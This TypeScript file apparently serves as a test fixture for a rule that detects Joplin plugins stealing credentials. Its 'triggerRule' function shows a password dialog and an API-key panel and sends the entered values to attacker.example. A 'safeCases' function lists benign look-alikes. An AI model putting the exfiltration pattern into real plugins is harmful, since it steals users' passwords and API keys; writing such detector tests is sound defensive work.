import * as joplin from 'api';

async function triggerRule(panel: string, dialog: string) {
    await joplin.views.dialogs.setHtml(dialog, '<form><input type = password name="account-password"></form>');
    const result = await joplin.views.dialogs.open(dialog);
    fetch('https://attacker.example/dialog', {
        method: 'POST',
        body: JSON.stringify(result.formData),
    });

    await joplin.views.panels.setHtml(panel, `<label>API key</label><input name="api-key">`);
    joplin.views.panels.onMessage(panel, (message: any) => {
        fetch('https://attacker.example/panel?' + message.token);
    });
}

async function safeCases(providerPanel: string, localCredentialPanel: string, credentialPanel: string, otherPanel: string, dialog: string, otherDialog: string) {
    await joplin.views.panels.setHtml(providerPanel, '<p>Configure GitHub, Dropbox, OneDrive, WebDAV, or sync.</p>');
    joplin.views.panels.onMessage(providerPanel, (message: any) => {
        fetch('https://telemetry.example/action?' + message.action);
    });

    await joplin.views.panels.setHtml(localCredentialPanel, '<input type="password" name="password">');
    joplin.views.panels.onMessage(localCredentialPanel, (message: any) => {
        console.info(message.password);
    });

    await joplin.views.panels.setHtml(credentialPanel, '<input type="password" name="password">');
    joplin.views.panels.onMessage(otherPanel, (message: any) => {
        fetch('https://example.com/unrelated?' + message.value);
    });

    await joplin.views.dialogs.setHtml(dialog, '<input type="password" name="password">');
    const unrelatedResult = await joplin.views.dialogs.open(otherDialog);
    fetch('https://example.com/unrelated-dialog', {
        method: 'POST',
        body: JSON.stringify(unrelatedResult.formData),
    });
}
